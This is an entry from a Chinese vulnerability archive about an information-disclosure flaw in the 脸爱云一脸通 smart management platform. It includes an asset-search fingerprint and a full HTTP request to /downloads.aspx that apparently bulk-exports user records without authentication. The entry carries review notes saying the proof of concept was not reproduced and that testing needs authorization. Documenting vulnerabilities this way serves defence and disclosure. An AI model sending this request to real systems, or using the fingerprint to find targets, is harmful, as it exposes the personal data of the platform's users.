---
source: "wy876 漏洞文库"
title: "脸爱云一脸通智慧管理平台 downloads UserInfo批量导出信息泄露"
product: "脸爱云一脸通智慧管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，Ename=UserInfo导出功能"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lim8z4ebk4m2ztoh"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%84%B8%E7%88%B1%E4%BA%91/%E8%84%B8%E7%88%B1%E4%BA%91%E4%B8%80%E8%84%B8%E9%80%9A%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0downloads%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
hunter: "web.icon==\"4f0be080512ee0b45fc90ff894b6ba60\""
id: "vw-e4d22436316e4bbee504b1f2"
entity_id: "ve-e4d22436316e4bbee504b1f2"
schema_version: "1"
previous_fofa_unverified: "web.icon=="
---

# 脸爱云一脸通智慧管理平台 downloads UserInfo批量导出信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：脸爱云一脸通智慧管理平台；downloads UserInfo批量导出信息泄露
- 版本、配置及部署条件：版本未知，Ename=UserInfo导出功能
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- total1000只是请求值，不证明实际导出数量；无响应文件格式/字段证据
- 需核导出权限与可枚举范围；Hunter错入fofa、版本修复缺失

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。脸爱云一脸通智慧管理平台downloads存在信息泄露漏洞。

## 二、影响版本
+ 脸爱云一脸通智慧管理平台

## 三、资产测绘
+ hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+ 特征


## 四、漏洞复现
```http
GET /downloads.aspx?Ename=UserInfo&total=1000&jsonParam={%22rybh%22:%22%22,%22ryxm%22:%22%22,%22EngName%22:%22%22,%22groupname%22:%22%22,%22companyname%22:%22%22,%22bmmc%22:%22%22,%22ryzt%22:%22%22,%22rzstartime%22:%22%22,%22rzendtime%22:%22%22,%22lzstartime%22:%22%22,%22lzendtime%22:%22%22,%22zhiwu%22:%22%22,%22cardid%22:%22%22,%22rfzt%22:%22%22,%22klb%22:%22%22,%22sxstartime%22:%22%22,%22sxendtime%22:%22%22,%22khstartime%22:%22%22,%22khendtime%22:%22%22,%22rfoperator%22:%22%22,%22rfstartime%22:%22%22,%22rfendtime%22:%22%22,%22feat%22:%22%22} HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lim8z4ebk4m2ztoh>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
